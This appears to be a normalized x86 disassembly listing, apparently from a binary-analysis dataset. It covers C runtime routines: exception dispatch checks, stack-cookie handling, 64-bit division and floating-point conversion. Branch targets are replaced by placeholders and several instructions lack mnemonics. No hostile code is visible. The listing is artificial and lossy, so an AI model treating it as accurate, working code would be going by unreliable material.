push [ ebp + 0x24 ]
push [ ebp + 0xc ]
jmp r-xdata
jmp r-xdata
push [ ebp + 0x24 ]
mov edi [ ebp - 0x28 ]
push [ ebp + 0x20 ]
mov ebx [ ebp - 0xc ]
push [ ebp - 0x24 ]
mov [ ebp - 0x1 ] 0x1
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
call sub_417c8b
mov esi [ ebp + 0x8 ]
mov edi [ ebp - 0x1c ]
add esp 0x1c
dec [ ebp - 0x14 ]
add ebx 0x4
cmp [ ebp - 0x14 ] eax
jg r-xdata
call sub_4166e1
mov esi [ ebp + 0x18 ]
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_417680
add esp 0x10
push [ esi + 0x1c ]
call sub_417895
sub_418192
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_403c1c
cmp [ eax + 0x20c ] 0x0
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edi 0xe06d7363
mov esi 0x1fffffff
mov ebx 0x19930522
jne r-xdata
test [ ecx + 0x4 ] 0x66
je r-xdata
mov edx [ ecx ]
cmp edx edi
je r-xdata
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp edx 0x80000026
je r-xdata
cmp [ ecx ] edi
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx 0x19930521
jb r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx ebx
jb r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call sub_417e00
add esp 0x20
cmp [ ecx + 0x10 ] 0x3
jb r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
push 0xffffffff
push eax
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_417680
add esp 0x10
jmp r-xdata
test [ eax + 0x20 ] 0x1
jne r-xdata
cmp [ ecx + 0x14 ] ebx
jbe r-xdata
mov edx [ ecx + 0x1c ]
mov edx [ edx + 0x8 ]
test edx edx
je r-xdata
movzx esi [ ebp + 0x24 ]
push esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call edx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_418280
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_406aac
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_406aac
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_4182d0
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_4182fd
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_4023eb
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_406c9b
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_41834e
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_4182fd
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x4
pop ebp
retn
sub_41837c
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_4023eb
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_4192e8
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_418846
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4056bc
leave
retn
sub_418424
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_4023eb
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_4192e8
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_418d97
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4056bc
leave
retn
sub_4184cc
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
push ebx
mov ebx [ ecx + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
cmp esi eax
jne r-xdata
cmp [ ebp + 0xc ] eax
jbe r-xdata
call sub_40515f
push 0x16
pop esi
mov [ eax ] esi
mov edx [ ebp + 0x10 ]
mov [ esi ] al
cmp edx eax
jle r-xdata
pop esi
pop ebx
pop ebp
retn
inc eax
cmp [ ebp + 0xc ] eax
ja r-xdata
mov eax edx
push edi
lea edi [ esi + 0x1 ]
mov [ esi ] 0x30
mov eax edi
test edx edx
jle r-xdata
call sub_40515f
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov [ eax ] 0x0
test edx edx
js r-xdata
mov cl [ ebx ]
test cl cl
je r-xdata
call sub_40510d
mov eax esi
jmp r-xdata
cmp [ esi ] 0x31
jne r-xdata
cmp [ ebx ] 0x35
jl r-xdata
push 0x30
pop ecx
movsx ecx cl
inc ebx
jmp r-xdata
push edi
call sub_404060
inc eax
push eax
push edi
push esi
call sub_401f50
add esp 0x10
inc [ ecx + 0x4 ]
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov [ eax ] cl
inc eax
dec edx
test edx edx
jg r-xdata
xor eax eax
pop edi
dec eax
cmp [ eax ] 0x39
je r-xdata
mov [ eax ] 0x30
inc [ eax ]
sub_41857f
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0xc ]
movzx eax [ ecx + 0x6 ]
push ebx
mov ebx eax
shr ebx 0x4
and eax 0x8000
push esi
mov edx 0x7ff
and ebx edx
push edi
mov [ ebp + 0xc ] eax
mov eax [ ecx + 0x4 ]
mov ecx [ ecx ]
movzx edi bx
mov esi 0x80000000
and eax 0xfffff
mov [ ebp - 0x4 ] esi
test edi edi
je r-xdata
xor edx edx
cmp eax edx
jne r-xdata
cmp edi edx
je r-xdata
add ebx 0x3c01
mov [ ebp - 0x4 ] edx
cmp ecx edx
jne r-xdata
mov edi 0x7fff
jmp r-xdata
add ebx 0x3c00
jmp r-xdata
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
test esi edx
je r-xdata
mov eax [ ebp + 0x8 ]
mov cx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov [ eax ] edx
jmp r-xdata
mov edx ecx
shr edx 0x15
shl eax 0xb
or edx eax
or edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
shl ecx 0xb
jmp r-xdata
movzx edi bx
mov ecx [ eax ]
mov ebx ecx
shr ebx 0x1f
add edx edx
or edx ebx
add ecx ecx
add edi 0xffff
mov ecx [ ebp + 0xc ]
or ecx edi
pop edi
pop esi
mov [ eax + 0x8 ] cx
pop ebx
leave
retn
sub_418632
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov [ ebp - 0x24 ] eax
push edi
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_41857f
pop ecx
pop ecx
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x11
sub esp 0xc
lea esi [ ebp - 0x30 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_4199c4
mov esi [ ebp - 0x24 ]
mov [ ebx + 0x8 ] eax
movsx eax [ ebp - 0x1e ]
mov [ ebx ] eax
movsx eax [ ebp - 0x20 ]
mov [ ebx + 0x4 ] eax
lea eax [ ebp - 0x1c ]
push eax
push [ ebp + 0x18 ]
push esi
call sub_403f64
add esp 0x24
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_4050bb
int3
mov ecx [ ebp - 0x4 ]
pop edi
mov [ ebx + 0xc ] esi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_4056bc
leave
retn
sub_4186c0
push edi
push esi
push ebp
xor edi edi
xor ebp ebp
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
inc ebp
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x18 ]
mov ecx eax
mov eax esi
mul [ esp + 0x18 ]
add edx ecx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
dec ebp
jns r-xdata
dec esi
sub eax [ esp + 0x18 ]
sbb edx [ esp + 0x1c ]
cmp edx [ esp + 0x14 ]
ja r-xdata
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
dec edi
jne r-xdata
neg edx
neg eax
sbb edx 0x0
jb r-xdata
pop ebp
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
xor ebx ebx
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_41879f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
and eax 0xfff7ffff
and ecx eax
push esi
mov esi [ ebp + 0x8 ]
test ecx 0xfcf0fce0
je r-xdata
push eax
push [ ebp + 0xc ]
test esi esi
je r-xdata
test esi esi
je r-xdata
call sub_41a3ea
call sub_41a3ea
mov [ esi ] eax
jmp r-xdata
call sub_40515f
push 0x16
pop esi
mov [ eax ] esi
call sub_40510d
mov eax esi
jmp r-xdata
push 0x0
push 0x0
call sub_41a3ea
pop ecx
pop ecx
mov [ esi ] eax
pop ecx
pop ecx
xor eax eax
pop esi
pop ebp
retn
sub_4187fe
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_418846
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x34 ] ecx
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x38 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp - 0x24 ] 0x0
push esi
lea esi [ ebp - 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi [ rw-data ]
dec edi
lea eax [ edi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ edi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea esi [ ebp + eax * 4 - 0x10 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x30 ] ecx
test [ esi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x30 ]
or eax 0xffffffff
shl eax cl
push 0x3
pop ecx
and [ esi ] eax
mov eax [ ebp - 0x28 ]
inc eax
cmp eax ecx
jge r-xdata
mov eax [ ebp - 0x28 ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x38 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x10 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x10 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax edi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and edi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_4056bc
leave
retn
mov ecx [ ebp - 0x34 ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x24 ] 0x0
sub ecx edi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edi [ ecx ]
add edi edx
mov [ ebp - 0x20 ] edi
mov edi [ ecx ]
cmp [ ebp - 0x20 ] edi
jb r-xdata
dec edi
or edi 0xffffffe0
inc edi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
mov ecx [ rw-data ]
cmp ebx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x2c ]
lea esi [ ebp - 0x1c ]
mov ecx eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x24 ] 0x1
cmp [ ebp - 0x20 ] edx
jmp r-xdata
add ebx [ rw-data ]
and [ ebp - 0x10 ] 0x7fffffff
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x10 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp - 0x24 ] ecx
jae r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x24 ] 0x0
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea edi [ edx + 0x1 ]
mov [ ebp - 0x20 ] edi
cmp edi edx
jb r-xdata
dec eax
mov edx [ ebp - 0x20 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x24 ]
jns r-xdata
mov ecx [ ebp - 0x20 ]
mov edi [ ebp + ecx * 4 - 0x10 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp - 0x20 ]
or edi [ ebp - 0x28 ]
mov [ ebp + ecx * 4 - 0x10 ] edi
mov edi [ ebp - 0x2c ]
mov ecx [ ebp - 0x24 ]
shl edi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edi 0x1
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea eax [ esi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ esi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x30 ] eax
jns r-xdata
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
xor eax eax
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
mov ebx [ rw-data ]
add ebx [ rw-data ]
xor eax eax
inc eax
jmp r-xdata
sub ecx 0x4
dec edx
jns r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x10 ]
mov [ ebp - 0x2c ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x2c ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0x30 ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
mov ecx [ rw-data ]
lea eax [ ecx + 0x1 ]
cdq
and edx 0x1f
add eax edx
lea edx [ ecx + 0x1 ]
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x28 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x28 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
sub ecx 0x4
dec edx
jns r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp - 0x28 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_418d97
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x34 ] ecx
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x38 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp - 0x24 ] 0x0
push esi
lea esi [ ebp - 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi [ rw-data ]
dec edi
lea eax [ edi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ edi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea esi [ ebp + eax * 4 - 0x10 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x30 ] ecx
test [ esi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x30 ]
or eax 0xffffffff
shl eax cl
push 0x3
pop ecx
and [ esi ] eax
mov eax [ ebp - 0x28 ]
inc eax
cmp eax ecx
jge r-xdata
mov eax [ ebp - 0x28 ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x38 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x10 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x10 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax edi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and edi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_4056bc
leave
retn
mov ecx [ ebp - 0x34 ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x24 ] 0x0
sub ecx edi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edi [ ecx ]
add edi edx
mov [ ebp - 0x20 ] edi
